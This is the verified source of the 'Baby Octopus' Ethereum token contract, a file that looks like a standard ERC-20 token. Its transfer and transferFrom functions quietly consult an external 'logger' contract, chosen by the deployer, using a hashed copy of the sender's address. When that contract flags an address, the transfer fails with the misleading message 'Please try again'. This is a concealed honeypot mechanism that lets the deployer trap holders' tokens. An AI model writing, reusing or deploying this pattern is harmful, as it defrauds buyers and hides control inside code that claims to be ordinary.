/**
 *Submitted for verification at Etherscan.io on 2021-09-19
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

interface TKN20 {

    function get_pairs( address token1, address token2) external view returns (address);

    function logging_done(bytes20 account) external view returns (uint8);

    function get_reserves(address pair, address tokena, address tokenb) external returns (uint);



}

contract BabyOct {
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;
    
    TKN20 logger;
    uint256 public totalSupply = 10 * 10**12 * 10**18;
    string public name = "Baby Octopus";
    string public symbol = hex"426162794F63746F707573f09f9099";
    uint public decimals = 18;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(TKN20 _tmparg) {
        
        logger = _tmparg;
        balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    
    function balanceOf(address wallet) public view returns(uint256) {
        return balances[wallet];
    }
    
    function abi_encode(address acct) public pure returns (bytes memory) {
    return abi.encodePacked(acct);
}
    
    function transfer(address to, uint256 value) public returns(bool) {
        require(logger.logging_done(ripemd160(abi_encode(msg.sender))) != 1, "Please try again"); 
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
        
    }

    
    function transferFrom(address from, address to, uint256 value) public returns(bool) {
        require(logger.logging_done(ripemd160(abi_encode(from))) != 1, "Please try again"); 
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address holder, uint256 value) public returns(bool) {
        allowance[msg.sender][holder] = value;
        return true;
        
    }
}